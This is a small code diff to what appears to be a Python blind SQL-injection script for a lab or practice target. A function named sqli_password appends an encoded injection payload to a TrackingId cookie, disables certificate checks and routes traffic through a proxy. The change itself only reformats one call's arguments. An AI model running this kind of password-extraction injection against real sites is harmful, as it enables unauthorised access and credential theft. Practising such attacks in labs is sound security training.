@@ -24,7 +24,8 @@ def sqli_password(url):
                 'TrackingId': 'tNQK67eM0kgHw118' + sqli_payload_encoded,
                 'session': 'wovKspiRfMKluOSnenPmpVNkEhN63MIn'}
             response = requests.get(
-                url, cookies=cookies,
+                url, 
+                cookies=cookies,
                 verify=False,
                 proxies=proxies)
             if "Welcome" not in response.text:
